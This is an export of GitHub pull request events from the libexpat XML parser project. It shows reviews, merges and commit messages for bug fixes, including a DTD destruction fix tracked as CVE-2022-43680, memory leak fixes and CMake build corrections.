650,IssueComment,2022-10-17 20:47:00,RMJ10,unfork_merge,"Review time:

A short and neat fix, I like it!  I can't find any other places in the code where there might be a similar problem due to `parser->m_isParamEntity` being False, so this should do the job nicely.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281475220"", ""author_association"": ""CONTRIBUTOR""}"
650,IssueComment,2022-10-17 20:49:33,hartwork,unfork_merge,"@RMJ10 excellent, thank you!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281477920"", ""author_association"": ""MEMBER""}"
650,HeadRefForcePushed,2022-10-17 20:51:25,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7605794985"", ""commit_url"": null}"
650,HeadRefForcePushed,2022-10-19 17:23:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7623871347"", ""commit_url"": null}"
650,RenameTitle,2022-10-24 12:55:36,hartwork,unfork_merge,,"{""rename"": {""from"": ""Fix overeager DTD destruction (fixes #649)"", ""to"": ""[Use CVE-2022-43680] Fix overeager DTD destruction (fixes #649)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7653713944""}"
650,RenameTitle,2022-10-24 12:55:47,hartwork,unfork_merge,,"{""rename"": {""from"": ""[Use CVE-2022-43680] Fix overeager DTD destruction (fixes #649)"", ""to"": ""[CVE-2022-43680] Fix overeager DTD destruction (fixes #649)""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7653715467""}"
650,Revise,2022-10-24 12:58:45,hartwork,unfork_merge,lib: Fix overeager DTD destruction in XML_ExternalEntityParserCreate,"{""sha"": ""5290462a7ea1278a8d5c0d5b2860d4e244f997e4"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-20T00:44:34Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T12:58:45Z""}}"
650,Revise,2022-10-24 12:58:45,hartwork,unfork_merge,tests: Cover overeager DTD destruction in XML_ExternalEntityParserCreate,"{""sha"": ""43992e4ae25fc3dc0eec0cd3a29313555d56aee2"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-19T16:16:15Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T12:58:45Z""}}"
650,Revise,2022-10-24 12:58:45,hartwork,unfork_merge,Changes: Document #649,"{""sha"": ""eedc5f6de8e219130032c8ff2ff17580e18bd0c1"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-21T01:32:26Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T12:58:45Z""}}"
650,HeadRefForcePushed,2022-10-24 12:59:46,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7653746327"", ""commit_url"": null}"
650,MergePR,2022-10-24 14:34:19,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654650958"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/56967f83d68d5fc750f9e66a9a76756c94c7c173""}"
650,DeleteBranch,2022-10-24 14:45:20,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654756537"", ""commit_url"": null}"
650,CrossReferenced,2022-11-03 17:44:05,CamberLoid,unfork_merge,"expat: Multiple vulnerabilites (CVE-2022-40674, CVE-2022-43680)","{""reference"": {""url"": ""https://api.github.com/repos/AOSC-Dev/aosc-os-abbs/issues/4244"", ""is_pull_request"": false}}"
651,SubmitCommit,2022-09-21 14:57:18,pkopylov,fork_close,Fix doProlog() memory leak,"{""sha"": ""f143842ff7aaadd1fa5d6c6baf95f4f9e82d1c79"", ""author"": {""name"": ""Pavel Kopylov"", ""email"": ""pkopylov@cloudlinux.com"", ""date"": ""2022-09-21T14:57:18Z""}, ""committer"": {""name"": ""Pavel Kopylov"", ""email"": ""pkopylov@cloudlinux.com"", ""date"": ""2022-09-21T14:57:18Z""}}"
651,OpenPR,2022-09-21 15:04:27,pkopylov,fork_close,,
651,ReviewRejected,2022-09-21 15:23:50,hartwork,fork_close,"Hi @pkopylov I believe the proposed change and the bug report is mistaken. The [API docs of function `XML_SetElementDeclHandler`](https://libexpat.github.io/doc/api/latest/#XML_SetElementDeclHandler) say:

> It's the user code's responsibility to free `model` when finished with it. See [XML_FreeContentModel](https://libexpat.github.io/doc/api/latest/#XML_FreeContentModel).

Furthermore this behavior is documented at [Common Pitfalls:  Element declaration handlers must free their content models](https://libexpat.github.io/doc/common-pitfalls/#free-content-model). So this ""leak"" is known and documented, good design or bad.

@pkopylov with that said: can this pull request be closed as ""not an issue""?

PS: The current CI runs the test suite with LeakSanitizer active for every `git push`. ","{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/651#pullrequestreview-1115637667""}"
651,Labeled,2022-09-21 15:24:49,hartwork,fork_close,invalid,
651,Labeled,2022-09-21 15:24:59,hartwork,fork_close,question,
651,Assigned,2022-09-21 15:25:03,hartwork,fork_close,,"{""assignee"": {""login"": ""hartwork"", ""id"": 1577132, ""node_id"": ""MDQ6VXNlcjE1NzcxMzI="", ""avatar_url"": ""https://avatars.githubusercontent.com/u/1577132?v=4"", ""gravatar_id"": """", ""url"": ""https://api.github.com/users/hartwork"", ""html_url"": ""https://github.com/hartwork"", ""followers_url"": ""https://api.github.com/users/hartwork/followers"", ""following_url"": ""https://api.github.com/users/hartwork/following{/other_user}"", ""gists_url"": ""https://api.github.com/users/hartwork/gists{/gist_id}"", ""starred_url"": ""https://api.github.com/users/hartwork/starred{/owner}{/repo}"", ""subscriptions_url"": ""https://api.github.com/users/hartwork/subscriptions"", ""organizations_url"": ""https://api.github.com/users/hartwork/orgs"", ""repos_url"": ""https://api.github.com/users/hartwork/repos"", ""events_url"": ""https://api.github.com/users/hartwork/events{/privacy}"", ""received_events_url"": ""https://api.github.com/users/hartwork/received_events"", ""type"": ""User"", ""site_admin"": false}}"
651,IssueComment,2022-09-21 16:04:42,pkopylov,fork_close,"Hi @hartwork! Thank you for your timely answer. 
If I understand right, a code inside the function pointed by `parser->m_elementDeclHandler ` should free the `content`.
In such a case please close this issue as ""not an issue"". 
Have a nice evening!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1253917725"", ""author_association"": ""NONE""}"
651,IssueComment,2022-09-21 16:11:21,hartwork,fork_close,"@pkopylov yes, that's what I meant. The handler can also save the pointer to free it later (as documented since pull request #575) but the application using Expat has to free that memory on its own _somewhere_.

Thanks for the quick reply, wishing you a nice evening, too! :beers: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1253926953"", ""author_association"": ""MEMBER""}"
651,ClosePR,2022-09-21 16:11:22,hartwork,fork_close,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7432411098"", ""commit_url"": null}"
653,OpenPR,2022-09-22 15:22:34,hartwork,unfork_merge,,
653,Labeled,2022-09-22 15:22:43,hartwork,unfork_merge,bug,
653,CrossReferenced,2022-09-22 15:27:50,hartwork,unfork_merge,Bugfixes,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/616"", ""is_pull_request"": true}}"
653,IssueComment,2022-10-07 16:14:27,c01db33f,unfork_merge,"Yep, this looks good to me. Again a smaller change than my fix! ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1271789796"", ""author_association"": ""NONE""}"
653,Revise,2022-10-07 17:30:10,hartwork,unfork_merge,tests: Cover leak of opening tag bindings after closing tag mismatch error,"{""sha"": ""d7ea13f504a93c90e4b711bd3fc02b29a5380451"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-22T14:49:32Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-07T17:30:10Z""}}"
653,Revise,2022-10-07 17:30:10,hartwork,unfork_merge,"lib: Stop leaking opening tag bindings after closing tag mismatch error

.. by moving the opening tag onto the free tag list only
*after* the tag match check has passed.","{""sha"": ""16a4db928bc75d93e798abb47c0b6696eef3355b"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-22T14:51:17Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-07T17:30:10Z""}}"
653,Revise,2022-10-07 17:30:46,hartwork,unfork_merge,Changes: Document #652,"{""sha"": ""8510b2c551535a29a654c997d8af8239cbee7c8c"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-22T15:11:59Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-07T17:30:46Z""}}"
653,HeadRefForcePushed,2022-10-07 17:31:29,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545366446"", ""commit_url"": null}"
653,IssueComment,2022-10-07 17:57:25,hartwork,unfork_merge,"@c01db33f excellent, thank you! :+1: ","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1271884335"", ""author_association"": ""MEMBER""}"
653,IssueComment,2022-10-17 20:29:54,RMJ10,unfork_merge,"@hartwork asked for a review, so here I am!

The fix looks good to me.  :+1: 

We need to think about tests for memory leaks in general a bit harder, I think.  It would be nice not to rely on external memory sanitizers, and have some simple tracking allocator for regression tests like this.  That's a project for another time, though.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281454937"", ""author_association"": ""CONTRIBUTOR""}"
653,IssueComment,2022-10-17 20:37:13,hartwork,unfork_merge,"> @hartwork asked for a review, so here I am!
> 
> The fix looks good to me. +1

@RMJ10 thank you!


> We need to think about tests for memory leaks in general a bit harder, I think. It would be nice not to rely on external memory sanitizers, and have some simple tracking allocator for regression tests like this. That's a project for another time, though.

I think I have a rough idea of what you have in mind. Let's discuss details some time.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281464645"", ""author_association"": ""MEMBER""}"
653,MergePR,2022-10-17 20:37:30,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7605711674"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/15026eb853ff945127b077598985365349f63d59""}"
653,DeleteBranch,2022-10-17 20:49:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7605786499"", ""commit_url"": null}"
654,Labeled,2022-09-25 17:44:08,hartwork,unfork_merge,bug,
654,OpenPR,2022-09-25 17:44:08,hartwork,unfork_merge,,
654,CrossReferenced,2022-09-25 17:46:26,hartwork,unfork_merge,suspend in nested entity context forgets about entity stack on resume,"{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/613"", ""is_pull_request"": false}}"
654,HeadRefForcePushed,2022-10-07 17:36:00,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7545390452"", ""commit_url"": null}"
654,IssueComment,2022-10-17 21:04:08,RMJ10,unfork_merge,"@hartwork asked for a review again.

The first commit simplifying the control flow looks like it is just for human readability.  A competent compiler doing any optimisation at all ought to be making the same decisions.  Still, improving human readability is a good thing, so that gets a :+1: from me.

The fix itself makes perfect sense, and is nicely commented.  I'm a little surprised that this hasn't come up before, but I suppose that suspending the parse is relatively uncommon.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281492136"", ""author_association"": ""CONTRIBUTOR""}"
654,IssueComment,2022-10-17 21:10:00,hartwork,unfork_merge,@RMJ10 thank you!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1281498427"", ""author_association"": ""MEMBER""}"
654,Revise,2022-10-17 21:11:10,hartwork,unfork_merge,"lib: Simplify control flow in internalEntityProcessor

The key is that all branches but the last ended in `return`.

```
BEFORE              |   AFTER
--------------------+--------------------
if (..a..) {        | if (..a..) {
    ..b..;          |     ..b..;
    return ..c..;   |     return ..c..;
                    | }
} else if (..d..) { | if (..d..) {
    ..e..;          |     ..e..;
    return ..f..;   |     return ..f..;
} else {            | }
    ..g..;          | ..g..;
}                   |
```","{""sha"": ""9d26eda6f85b052cae8706b7b2c398ad85c7a866"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-25T15:17:04Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-17T21:11:10Z""}}"
654,Revise,2022-10-17 21:11:10,hartwork,unfork_merge,lib: Fix suspend with inside nested entites in internalEntityProcessor,"{""sha"": ""6fa8957d335d5463428bba197468cd07834e3952"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-25T15:55:41Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-17T21:11:10Z""}}"
654,Revise,2022-10-17 21:11:10,hartwork,unfork_merge,tests: Cover suspend with inside nested entites in internalEntityProcessor,"{""sha"": ""fc95d53eb5ee3ec2ec492926dfaf09e1bfe2ff7a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-25T17:01:58Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-17T21:11:10Z""}}"
654,Revise,2022-10-17 21:11:52,hartwork,unfork_merge,Changes: Document #613,"{""sha"": ""6acab0a2d9f3507602e65979e435f42bebb7645a"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-09-25T17:38:14Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-17T21:11:52Z""}}"
654,HeadRefForcePushed,2022-10-17 21:12:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7605924758"", ""commit_url"": null}"
654,MergePR,2022-10-17 23:32:06,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7606617479"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/91920104deaad56e8cba3ec2cfd557d389d61cdd""}"
654,DeleteBranch,2022-10-17 23:32:26,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7606618696"", ""commit_url"": null}"
655,SubmitCommit,2022-09-25 22:06:48,musvaage,fork_merge,typo,"{""sha"": ""bea473ab5515e0c70057bbd5c63cc7dacb54640c"", ""author"": {""name"": ""musvaage"", ""email"": ""112724366+musvaage@users.noreply.github.com"", ""date"": ""2022-09-25T22:06:48Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-09-25T22:06:48Z""}}"
655,OpenPR,2022-09-25 22:08:41,musvaage,fork_merge,,
655,Revise,2022-09-25 22:14:28,musvaage,fork_merge,typo,"{""sha"": ""6acb740dc82a7ea746ce4ff8634898b57b68a72e"", ""author"": {""name"": ""musvaage"", ""email"": ""112724366+musvaage@users.noreply.github.com"", ""date"": ""2022-09-25T22:14:28Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-09-25T22:14:28Z""}}"
655,RenameTitle,2022-09-25 22:14:51,musvaage,fork_merge,,"{""rename"": {""from"": ""fix typo"", ""to"": ""fix typos""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7454130827""}"
655,ReviewApproved,2022-09-25 22:25:54,hartwork,fork_merge,@musvaage thank you! :+1: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/655#pullrequestreview-1119461168""}"
655,MergePR,2022-09-25 22:26:04,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7454145206"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/c7b546595eeef824d904cf9058457d6e086264f6""}"
655,IssueCommentSupplement,2022-09-25 23:19:58,musvaage,fork_merge,"I noticed the files bundled in the python/cpython repository.

Thank you for the merge!","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1257304674"", ""author_association"": ""CONTRIBUTOR""}"
655,IssueCommentSupplement,2022-09-25 23:30:02,musvaage,fork_merge,Don't bother adding me to the .mailmap file for a one-off pull request.,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1257308333"", ""author_association"": ""CONTRIBUTOR""}"
655,Labeled,2022-09-26 13:15:45,hartwork,fork_merge,enhancement,
655,Labeled,2022-09-26 13:15:45,hartwork,fork_merge,documentation,
656,SubmitCommit,2022-10-03 22:10:36,Osyotr,fork_merge,"Fix generation of pkgconfig file

`CMAKE_*_POSTFIX` was changed to `EXPAT_*_POSTFIX` in https://github.com/libexpat/libexpat/pull/608. As a result, debug pkgconfig file was not correct.","{""sha"": ""2caced46003912f279504983ee0e558a5cc65c2f"", ""author"": {""name"": ""Osyotr"", ""email"": ""Osyotr@users.noreply.github.com"", ""date"": ""2022-10-03T22:10:36Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-10-03T22:10:36Z""}}"
656,OpenPR,2022-10-03 22:10:50,Osyotr,fork_merge,,
656,CrossReferenced,2022-10-03 22:11:26,Osyotr,fork_merge,[expat] Update to 2.4.9,"{""reference"": {""url"": ""https://api.github.com/repos/microsoft/vcpkg/issues/27059"", ""is_pull_request"": true}}"
656,Labeled,2022-10-03 22:34:31,hartwork,fork_merge,bug,
656,ReviewRejected,2022-10-03 22:39:30,hartwork,fork_merge,@Osyotr thanks for taking this upstream! :+1: I confirm this to be a a regression in 2.4.9 from pull request #608. Please check out one comment below on a detail. Thanks!,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/656#pullrequestreview-1129107576""}"
656,RenameTitle,2022-10-03 22:40:00,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix generation of pkgconfig file"", ""to"": ""[2.4.9] CMake: Fix generation of pkgconfig file""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7511415493""}"
656,Revise,2022-10-03 22:54:10,Osyotr,fork_merge,Update comment regarding output file postfix,"{""sha"": ""2ce3fce01c47bf15c8eb4f1294c40f2064961689"", ""author"": {""name"": ""Osyotr"", ""email"": ""Osyotr@users.noreply.github.com"", ""date"": ""2022-10-03T22:54:10Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-10-03T22:54:10Z""}}"
656,ReviewApproved,2022-10-03 23:18:51,hartwork,fork_merge,,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/656#pullrequestreview-1129134795""}"
656,MergePR,2022-10-04 00:33:14,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7511901548"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/7185eee99a29a93a59a7bfa02f868116600ebf59""}"
656,DeleteBranch,2022-10-04 00:38:38,Osyotr,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7511925538"", ""commit_url"": null}"
656,Referenced,2022-10-24 16:36:33,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7655712901"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/82a9c09f6c1215af22ed5b86b558ffc226772a93""}"
658,SubmitCommit,2022-10-07 18:56:31,Osyotr,fork_merge,"Fix static library name when building with mingw

When building static library with mingw the output file name should be `libexpat.a`, not `libexpat-1.dll`.
This is a regression from https://github.com/libexpat/libexpat/pull/624
Original issue: https://github.com/microsoft/vcpkg/issues/27132","{""sha"": ""90bc7cf0ab81fad0f21c6796de8c4f10d40d964c"", ""author"": {""name"": ""Osyotr"", ""email"": ""Osyotr@users.noreply.github.com"", ""date"": ""2022-10-07T18:56:31Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-10-07T18:56:31Z""}}"
658,OpenPR,2022-10-07 18:57:50,Osyotr,fork_merge,,
658,CrossReferenced,2022-10-07 19:10:32,Osyotr,fork_merge,[expat] Fix static builds with mingw,"{""reference"": {""url"": ""https://api.github.com/repos/microsoft/vcpkg/issues/27137"", ""is_pull_request"": true}}"
658,ReviewApproved,2022-10-07 19:33:57,hartwork,fork_merge,@Osyotr thanks for taking this upstream! :+1: :+1: ,"{""author_association"": ""MEMBER"", ""html_url"": ""https://github.com/libexpat/libexpat/pull/658#pullrequestreview-1134996128""}"
658,RenameTitle,2022-10-07 20:00:30,hartwork,fork_merge,,"{""rename"": {""from"": ""Fix static library name when building with mingw"", ""to"": ""[2.4.9] CMake: Fix static library name when building with MinGW""}, ""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7546208468""}"
658,Labeled,2022-10-07 20:00:43,hartwork,fork_merge,bug,
658,MergePR,2022-10-07 21:04:31,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7546587427"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/ea4a24d7643667eb4200eee1fe2f232d54e06abf""}"
658,DeleteBranch,2022-10-07 21:44:06,Osyotr,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7546755333"", ""commit_url"": null}"
658,CrossReferenced,2022-10-16 14:15:41,hartwork,fork_merge,"[2.4.9] Expat no longer cross-compiles as "".a"" for use in static ffmpeg build","{""reference"": {""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/662"", ""is_pull_request"": false}}"
658,Referenced,2022-10-24 16:36:33,hartwork,fork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7655712911"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/82a9c09f6c1215af22ed5b86b558ffc226772a93""}"
659,SubmitCommit,2022-10-10 12:07:28,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/checkout from 3.0.2 to 3.1.0

Bumps [actions/checkout](https://github.com/actions/checkout) from 3.0.2 to 3.1.0.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v3.0.2...v3.1.0)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""cfa1c20be40ff7402caa67a779ebf6acfee66692"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-10-10T12:07:28Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-10-10T12:07:28Z""}}"
659,OpenPR,2022-10-10 12:07:29,dependabot[bot],unfork_merge,,
659,Labeled,2022-10-10 12:07:30,dependabot[bot],unfork_merge,enhancement,
659,MergePR,2022-10-10 13:16:21,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7554036960"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/46810602905246e9ab688f173dfd34fe1ad9f775""}"
659,DeleteBranch,2022-10-10 13:16:32,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7554038358"", ""commit_url"": null}"
663,SubmitCommit,2022-10-23 15:33:32,hartwork,unfork_merge,Protect expat_config.h against multiple inclusion,"{""sha"": ""6393f2d3ff2cdb96c3fe3eef300903d878263b18"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T15:13:44Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T15:33:32Z""}}"
663,Labeled,2022-10-23 15:35:14,hartwork,unfork_merge,enhancement,
663,OpenPR,2022-10-23 15:35:14,hartwork,unfork_merge,,
663,IssueComment,2022-10-23 16:48:39,RMJ10,unfork_merge,Thank you!,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1288152690"", ""author_association"": ""CONTRIBUTOR""}"
663,MergePR,2022-10-23 19:58:42,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7648907782"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/391551620eefa5fccfaaee07dab066cc552527b2""}"
663,DeleteBranch,2022-10-23 19:58:59,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7648908076"", ""commit_url"": null}"
665,SubmitCommit,2022-10-24 12:05:28,dependabot[bot],unfork_merge,"Actions(deps): Bump actions/upload-artifact from 3.1.0 to 3.1.1

Bumps [actions/upload-artifact](https://github.com/actions/upload-artifact) from 3.1.0 to 3.1.1.
- [Release notes](https://github.com/actions/upload-artifact/releases)
- [Commits](https://github.com/actions/upload-artifact/compare/v3.1.0...v3.1.1)

---
updated-dependencies:
- dependency-name: actions/upload-artifact
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>","{""sha"": ""66dc6066da9fc099f31cc77954bcaab2521be3ac"", ""author"": {""name"": ""dependabot[bot]"", ""email"": ""49699333+dependabot[bot]@users.noreply.github.com"", ""date"": ""2022-10-24T12:05:28Z""}, ""committer"": {""name"": ""GitHub"", ""email"": ""noreply@github.com"", ""date"": ""2022-10-24T12:05:28Z""}}"
665,OpenPR,2022-10-24 12:05:29,dependabot[bot],unfork_merge,,
665,Labeled,2022-10-24 12:05:30,dependabot[bot],unfork_merge,enhancement,
665,MergePR,2022-10-24 13:41:28,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654122814"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/5ac714074d2639e0b8bb82aa73ef51c4f7498d29""}"
665,IssueCommentSupplement,2022-10-24 13:41:30,dependabot[bot],unfork_merge,"OK, I won't notify you again about this release, but will get in touch when a new version is available. If you'd rather skip all updates until the next major or minor version, let me know by commenting `@dependabot ignore this major version` or `@dependabot ignore this minor version`. You can also ignore all major, minor, or patch releases for a dependency by adding an [`ignore` condition](https://docs.github.com/en/code-security/supply-chain-security/configuration-options-for-dependency-updates#ignore) with the desired `update_types` to your config file.

If you change your mind, just re-open this PR and I'll resolve any conflicts on it.","{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/comments/1289055074"", ""author_association"": ""CONTRIBUTOR""}"
665,DeleteBranch,2022-10-24 13:41:39,dependabot[bot],unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654124452"", ""commit_url"": null}"
666,SubmitCommit,2022-10-23 22:53:51,hartwork,unfork_merge,"examples/outline.c: Rename variable ""p"" to ""parser""","{""sha"": ""7eaccc0332830eb2cdff88495ce6a00f382f96ee"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T22:53:51Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T22:53:51Z""}}"
666,SubmitCommit,2022-10-23 22:58:25,hartwork,unfork_merge,"examples/outline.c: Make ""Buff"" a local variable","{""sha"": ""bd351fad2003e419fffa69fb0df87b3a021d3145"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T22:58:25Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T22:58:25Z""}}"
666,SubmitCommit,2022-10-23 23:29:05,hartwork,unfork_merge,"examples/outline.c: Rename ""Buff"" to ""buf"" for consistency across examples","{""sha"": ""56d85659ac7bd3b3487c1cf698a15a547efe9047"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:28:42Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:29:05Z""}}"
666,OpenPR,2022-10-24 13:27:34,hartwork,unfork_merge,,
666,Labeled,2022-10-24 13:27:34,hartwork,unfork_merge,enhancement,
666,Referenced,2022-10-24 13:29:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654013917"", ""commit_url"": ""https://api.github.com/repos/libexpat/libexpat/commits/88bec2fff82ad7df909bcd3dc764fef9571ebbea""}"
666,HeadRefForcePushed,2022-10-24 13:29:39,hartwork,unfork_merge,,"{""url"": ""https://api.github.com/repos/libexpat/libexpat/issues/events/7654013989"", ""commit_url"": null}"
666,Revise,2022-10-24 14:00:13,hartwork,unfork_merge,examples: Resolve use of unused variables argc and argv,"{""sha"": ""9c7bd378b6b008b99018d4374a2ec4172e9e4898"", ""author"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-23T23:30:24Z""}, ""committer"": {""name"": ""Sebastian Pipping"", ""email"": ""sebastian@pipping.org"", ""date"": ""2022-10-24T14:00:13Z""}}"
